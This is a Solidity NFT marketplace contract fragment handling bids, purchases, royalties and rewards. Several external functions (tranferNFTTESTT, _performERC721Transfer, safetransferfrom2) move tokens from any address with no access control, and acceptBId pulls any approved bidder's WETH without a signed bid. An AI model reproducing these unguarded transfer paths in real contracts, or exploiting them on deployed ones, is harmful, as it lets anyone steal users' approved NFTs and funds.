    uint256 constant BatchTransfer1155Params_ids_head_ptr = 0x64;
    uint256 constant BatchTransfer1155Params_amounts_head_ptr = 0x84;
    uint256 constant BatchTransfer1155Params_data_head_ptr = 0xa4;
    uint256 constant BatchTransfer1155Params_data_length_basePtr = 0xc4;
    uint256 constant BatchTransfer1155Params_calldata_baseSize = 0xc4;

    uint256 constant BatchTransfer1155Params_ids_length_ptr = 0xc4;

    uint256 constant BatchTransfer1155Params_ids_length_offset = 0xa0;
    uint256 constant BatchTransfer1155Params_amounts_length_baseOffset = 0xc0;
    uint256 constant BatchTransfer1155Params_data_length_baseOffset = 0xe0;

    uint256 constant ConduitBatch1155Transfer_usable_head_size = 0x80;

    uint256 constant ConduitBatch1155Transfer_from_offset = 0x20;
    uint256 constant ConduitBatch1155Transfer_ids_head_offset = 0x60;
    uint256 constant ConduitBatch1155Transfer_amounts_head_offset = 0x80;
    uint256 constant ConduitBatch1155Transfer_ids_length_offset = 0xa0;
    uint256 constant ConduitBatch1155Transfer_amounts_length_baseOffset = 0xc0;
    uint256 constant ConduitBatch1155Transfer_calldata_baseSize = 0xc0;

    // Note: abbreviated version of above constant to adhere to line length limit.
    uint256 constant ConduitBatchTransfer_amounts_head_offset = 0x80;

    uint256 constant Invalid1155BatchTransferEncoding_ptr = 0x00;
    uint256 constant Invalid1155BatchTransferEncoding_length = 0x04;
    uint256 constant Invalid1155BatchTransferEncoding_selector = (
        0xeba2084c00000000000000000000000000000000000000000000000000000000
    );

    uint256 constant ERC1155BatchTransferGenericFailure_error_signature = (
        0xafc445e200000000000000000000000000000000000000000000000000000000
    );
    uint256 constant ERC1155BatchTransferGenericFailure_token_ptr = 0x04;
    uint256 constant ERC1155BatchTransferGenericFailure_ids_offset = 0xc0;

    constructor() {}

    function initialize(
        address _seaGoldToken,
        address _wethToken,
        address _royaltyRegistry,
        address _feeAddress,
        address _stakingAddress,
        address _rewardCalcAddress,
        bool _seaGoldLaunched,
        bool _marketOpen
    ) public initializer {
        seaGoldFee = 5 * 1e17;
        deci = 18;
        SeaGoldToken = _seaGoldToken;
        WETHtoken = _wethToken;
        royaltyRegistry = _royaltyRegistry;
        FeeAddress = _feeAddress;
        StakingAddress = _stakingAddress;
        RewardCalcAddress = _rewardCalcAddress;
        SeaGoldLaunched = _seaGoldLaunched;
        MarketOpen = _marketOpen;
        IERC20 _seagoldtoken = IERC20(_seaGoldToken);
        seagoldtoken = _seagoldtoken;
        __Ownable_init();
    }

    uint256 public seaGoldFee;
    uint256 deci;

    struct saleStruct {
        address user;
        uint256 royaltyPer;
        uint256 amount;
        uint256 nonce;
        bytes signature;
        address seller;
        address royaddr;
        uint256 tokenId;
        uint256 nftType;
        uint256 nooftoken;
        address conAddr;
    }
    saleStruct salestruct;

    struct royaltyInf {
        bool status;
        address royAddress;
        uint256 royPercentage;
        bool isMutable;
    }

    royaltyInf royinf;

    receive() external payable {}

    function getBalanceOf() public view returns (uint256) {
        return seagoldtoken.balanceOf(address(this));
    }

    function updateSeaGoldToken(address _seaGoldToken) public onlyOwner {
        SeaGoldToken = _seaGoldToken;
    }

    function updateWETHtoken(address _wethtoken) public onlyOwner {
        WETHtoken = _wethtoken;
    }

    function updateRoyaltyRegistry(address _royaltyRegistry) public onlyOwner {
        royaltyRegistry = _royaltyRegistry;
    }

    function updateFeeAddress(address _feeAddress) public onlyOwner {
        FeeAddress = _feeAddress;
    }

    function updateStakingAddress(address _stakingAddress) public onlyOwner {
        StakingAddress = _stakingAddress;
    }

    function updateRewardCalcAddress(address _rewardCalcAddress)
        public
        onlyOwner
    {
        RewardCalcAddress = _rewardCalcAddress;
    }

    function updateSeaGoldLaunched(bool _seaGoldLaunched) public onlyOwner {
        SeaGoldLaunched = _seaGoldLaunched;
    }

    function updateMarketOpen(bool _marketOpen) public onlyOwner {
        MarketOpen = _marketOpen;
    }

    function acceptBId(
        address bidaddr,
        uint256 amount,
        uint256 tokenId,
        uint256 nooftoken,
        uint256 nftType,
        address _conAddr
    ) public {
        require(MarketOpen, "Market Closed");
        IERC20 t = IERC20(WETHtoken);
        uint256 approveValue = t.allowance(bidaddr, address(this));
        uint256 balance = t.balanceOf(bidaddr);
        require(approveValue >= amount, "Insufficient Approved");
        require(balance >= amount, "Insufficient Balance");

        salestruct.user = bidaddr;
        salestruct.amount = amount;
        salestruct.seller = msg.sender;
        salestruct.tokenId = tokenId;
        salestruct.nftType = nftType;
        salestruct.nooftoken = nooftoken;
        salestruct.conAddr = _conAddr;

        (uint256 netamount, uint256 royalty, uint256 goldfees) = calculateBid(
            salestruct.user,
            salestruct.amount,
            salestruct.seller,
            salestruct.conAddr
        );

        require(
            goldfees + royalty + netamount <= salestruct.amount,
            "Amount is not equal"
        );

        if (royalty > 0) {
            RoyaltyRegistry royReg = RoyaltyRegistry(royaltyRegistry);
            (, royinf.royAddress, , ) = royReg.getRoyaltyInfo(_conAddr);
            t.transferFrom(salestruct.user, royinf.royAddress, royalty);
        }

        t.transferFrom(salestruct.user, FeeAddress, goldfees);
        t.transferFrom(salestruct.user, salestruct.seller, netamount);
        RewardCalc rewardCalc = RewardCalc(RewardCalcAddress);
        uint256 sellerRewards;
        uint256 buyerRewards;
        if (SeaGoldLaunched) {
            (sellerRewards, buyerRewards) = rewardCalc.getRewardsAL(
                salestruct.amount
            );
        } else {
            (sellerRewards, buyerRewards) = rewardCalc.getRewardsBL(
                salestruct.amount
            );
        }
        uint256 seaGoldBalance = seagoldtoken.balanceOf(address(this));
        if (seaGoldBalance > (sellerRewards + buyerRewards)) {
            seagoldtoken.transfer(salestruct.seller, sellerRewards);
            seagoldtoken.transfer(salestruct.user, buyerRewards);
        }

        transferNft(
            salestruct.conAddr,
            salestruct.tokenId,
            salestruct.user,
            salestruct.nftType,
            salestruct.nooftoken,
            msg.sender
        );
    }

    function buyToken(
        address[] memory from,
        uint256[] memory tokenId,
        uint256[] memory amount,
        uint256[] memory nooftoken,
        uint256[] memory nftType,
        address[] memory _conAddr,
        bytes[] memory signature,
        uint256[] memory nonce,
        uint256 totalamount
    ) public payable {
        require(MarketOpen, "Market Closed");
        require(msg.value >= totalamount, "Invalid totalamount");
        for (uint256 i = 0; i < from.length; i++) {
            salestruct.user = msg.sender;
            salestruct.amount = amount[i];
            salestruct.nonce = nonce[i];
            salestruct.signature = signature[i];
            salestruct.seller = from[i];
            salestruct.tokenId = tokenId[i];
            salestruct.nftType = nftType[i];
            salestruct.nooftoken = nooftoken[i];
            salestruct.conAddr = _conAddr[i];

            (uint256 netamount, uint256 goldfee, uint256 roy) = calculateBuy(
                salestruct.user,
                salestruct.amount,
                salestruct.nonce,
                salestruct.signature,
                salestruct.seller,
                salestruct.conAddr
            );

            require(
                goldfee + roy + netamount <= salestruct.amount,
                "Amount is not equal"
            );

            payable(salestruct.seller).transfer(netamount);
            payable(FeeAddress).transfer(goldfee);

            if (roy > 0) {
                RoyaltyRegistry royReg = RoyaltyRegistry(royaltyRegistry);
                (, royinf.royAddress, , ) = royReg.getRoyaltyInfo(
                    salestruct.conAddr
                );
                payable(royinf.royAddress).transfer(roy);
            }
            RewardCalc rewardCalc = RewardCalc(RewardCalcAddress);
            uint256 sellerRewards;
            uint256 buyerRewards;
            if (SeaGoldLaunched) {
                (sellerRewards, buyerRewards) = rewardCalc.getRewardsAL(
                    salestruct.amount
                );
            } else {
                (sellerRewards, buyerRewards) = rewardCalc.getRewardsBL(
                    salestruct.amount
                );
            }
            uint256 seaGoldBalance = seagoldtoken.balanceOf(address(this));
            if (seaGoldBalance > (sellerRewards + buyerRewards)) {
                seagoldtoken.transfer(salestruct.seller, sellerRewards);
                seagoldtoken.transfer(salestruct.user, buyerRewards);
            }

            transferNft(
                salestruct.conAddr,
                salestruct.tokenId,
                msg.sender,
                salestruct.nftType,
                salestruct.nooftoken,
                salestruct.seller
            );
        }
    }

    function calculateBid(
        address buyer,
        uint256 amount,
        address seller,
        address _contractAddress
    )
        internal
        returns (
            uint256 netamount,
            uint256 roy,
            uint256 _goldfee
        )
    {
        RoyaltyRegistry royReg = RoyaltyRegistry(royaltyRegistry);
        (royinf.status, , royinf.royPercentage, ) = royReg.getRoyaltyInfo(
            _contractAddress
        );

        if (royinf.status) {
            salestruct.royaltyPer = royinf.royPercentage;
        } else {
            salestruct.royaltyPer = 0;
        }

        salestruct.user = buyer;
        salestruct.amount = amount;
        salestruct.seller = seller;
        (_goldfee, netamount, roy) = calc(
            amount,
            seaGoldFee,
            salestruct.royaltyPer
        );

        require(netamount + roy + _goldfee <= amount, "Invalid calc");

        return (netamount, roy, _goldfee);
    }

    function calculateBuy(
        address buyer,
        uint256 amount,
        uint256 nonce,
        bytes memory signature,
        address seller,
        address _contractAddress
    )
        internal
        returns (
            uint256 netamount,
            uint256 _goldfee,
            uint256 roy
        )
    {
        bytes32 message = prefixed(keccak256(abi.encodePacked(seller, nonce)));
        require(recoverSigner(message, signature) == seller, "wrong signature");

        RoyaltyRegistry royReg = RoyaltyRegistry(royaltyRegistry);
        (royinf.status, , royinf.royPercentage, ) = royReg.getRoyaltyInfo(
            _contractAddress
        );

        if (royinf.status) {
            salestruct.royaltyPer = royinf.royPercentage;
        } else {
            salestruct.royaltyPer = 0;
        }

        salestruct.user = buyer;
        salestruct.amount = amount;
        salestruct.seller = seller;

        (_goldfee, netamount, roy) = calc(
            amount,
            seaGoldFee,
            salestruct.royaltyPer
        );
        require(netamount + roy + _goldfee <= amount, "Invalid calc");
        return (netamount, _goldfee, roy);
    }

    function transferNft(
        address _conAddr,
        uint256 tokenId,
        address to,
        uint256 nftType,
        uint256 nooftoken,
        address nftowner
    ) internal {
        if (nftType == 721) {
            address ownerAddr = IERC721(_conAddr).ownerOf(tokenId);
            require(ownerAddr == nftowner, "Not an owner");
            IERC721(_conAddr).safeTransferFrom(nftowner, to, tokenId);
        } else {
            uint256 balanceFromCont = IERC1155(_conAddr).balanceOf(
                nftowner,
                tokenId
            );
            require(balanceFromCont >= nooftoken, "Insufficient Quantity");
            IERC1155(_conAddr).safeTransferFrom(
                nftowner,
                to,
                tokenId,
                nooftoken,
                ""
            );
        }
    }

    function pERCent(uint256 value1, uint256 value2)
        internal
        pure
        returns (uint256)
    {
        uint256 result = value1.mul(value2).div(1e20);
        return (result);
    }

    function calc(
        uint256 amount,
        uint256 _seaGoldFeeValue,
        uint256 royal
    )
        internal
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 fee = pERCent(amount, _seaGoldFeeValue);
        uint256 roy = pERCent(amount, royal);
        uint256 netamount = amount.sub(fee).sub(roy);
        return (fee, netamount, roy);
    }

    function prefixed(bytes32 hash) internal pure returns (bytes32) {
        return
            keccak256(
                abi.encodePacked("\x19Ethereum Signed Message:\n32", hash)
            );
    }

    function recoverSigner(bytes32 message, bytes memory sig)
        internal
        pure
        returns (address)
    {
        uint8 v;
        bytes32 r;
        bytes32 s;
        (v, r, s) = splitSignature(sig);
        return ecrecover(message, v, r, s);
    }

    function splitSignature(bytes memory sig)
        internal
        pure
        returns (
            uint8,
            bytes32,
            bytes32
        )
    {
        require(sig.length == 65);
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
        return (v, r, s);
    }

    function tranferNFTTESTT(
        address nftAddress,
        address from,
        address to,
        uint256 nftId
    ) external {
        uint256 nftAddr = uint256(uint160(nftAddress));
        assembly {
            // selector for transferFrom(address,address,uint256)
            mstore(
                0,
                0x23b872dd00000000000000000000000000000000000000000000000000000000
            )
            mstore(0x04, from)
            mstore(0x24, to)
            mstore(0x44, nftId)
            if iszero(call(gas(), and(nftAddr, MASK_160), 0, 0, 0x64, 0, 0)) {
                // revert("Failed to transfer ERC721.")
                mstore(
                    0,
                    0x08c379a000000000000000000000000000000000000000000000000000000000
                )
                mstore(
                    0x20,
                    0x0000002000000000000000000000000000000000000000000000000000000000
                )
                mstore(
                    0x40,
                    0x0000001a4661696c656420746f207472616e73666572204552433732312e0000
                )
                mstore(0x60, 0)
                revert(0, 0x64)
            }
        }
    }

    function _performERC721Transfer(
        address token,
        address from,
        address to,
        uint256 identifier
    ) external {
        // Utilize assembly to perform an optimized ERC721 token transfer.
        assembly {
            // If the token has no code, revert.
            if iszero(extcodesize(token)) {
                mstore(NoContract_error_sig_ptr, NoContract_error_signature)
                mstore(NoContract_error_token_ptr, token)
                revert(NoContract_error_sig_ptr, NoContract_error_length)
            }

            // The free memory pointer memory slot will be used when populating
            // call data for the transfer; read the value and restore it later.
            let memPointer := mload(FreeMemoryPointerSlot)

            // Write call data to memory starting with function selector.
            mstore(ERC721_transferFrom_sig_ptr, ERC721_transferFrom_signature)
            mstore(ERC721_transferFrom_from_ptr, from)
            mstore(ERC721_transferFrom_to_ptr, to)
            mstore(ERC721_transferFrom_id_ptr, identifier)

            // Perform the call, ignoring return data.
            let success := call(
                gas(),
                token,
                0,
                ERC721_transferFrom_sig_ptr,
                ERC721_transferFrom_length,
                0,
                0
            )

            // If the transfer reverted:
            if iszero(success) {
                // If it returned a message, bubble it up as long as sufficient
                // gas remains to do so:
                if returndatasize() {
                    // Ensure that sufficient gas is available to copy
                    // returndata while expanding memory where necessary. Start
                    // by computing word size of returndata & allocated memory.
                    // Round up to the nearest full word.
                    let returnDataWords := div(
                        add(returndatasize(), AlmostOneWord),
                        OneWord
                    )

                    // Note: use the free memory pointer in place of msize() to
                    // work around a Yul warning that prevents accessing msize
                    // directly when the IR pipeline is activated.
                    let msizeWords := div(memPointer, OneWord)

                    // Next, compute the cost of the returndatacopy.
                    let cost := mul(CostPerWord, returnDataWords)

                    // Then, compute cost of new memory allocation.
                    if gt(returnDataWords, msizeWords) {
                        cost := add(
                            cost,
                            add(
                                mul(
                                    sub(returnDataWords, msizeWords),
                                    CostPerWord
                                ),
                                div(
                                    sub(
                                        mul(returnDataWords, returnDataWords),
                                        mul(msizeWords, msizeWords)
                                    ),
                                    MemoryExpansionCoefficient
                                )
                            )
                        )
                    }

                    // Finally, add a small constant and compare to gas
                    // remaining; bubble up the revert data if enough gas is
                    // still available.
                    if lt(add(cost, ExtraGasBuffer), gas()) {
                        // Copy returndata to memory; overwrite existing memory.
                        returndatacopy(0, 0, returndatasize())

                        // Revert, giving memory region with copied returndata.
                        revert(0, returndatasize())
                    }
                }

                // Otherwise revert with a generic error message.
                mstore(
                    TokenTransferGenericFailure_error_sig_ptr,
                    TokenTransferGenericFailure_error_signature
                )
                mstore(TokenTransferGenericFailure_error_token_ptr, token)
                mstore(TokenTransferGenericFailure_error_from_ptr, from)
                mstore(TokenTransferGenericFailure_error_to_ptr, to)
                mstore(TokenTransferGenericFailure_error_id_ptr, identifier)
                mstore(TokenTransferGenericFailure_error_amount_ptr, 1)
                revert(
                    TokenTransferGenericFailure_error_sig_ptr,
                    TokenTransferGenericFailure_error_length
                )
            }

            // Restore the original free memory pointer.
            mstore(FreeMemoryPointerSlot, memPointer)

            // Restore the zero slot to zero.
            mstore(ZeroSlot, 0)
        }
    }

    function safetransferfrom2(
        IERC20 token,
        address from,
        address to,
        uint256 identifier
    ) external {
        token.safeTransferFrom721(from, to, identifier);
    }
}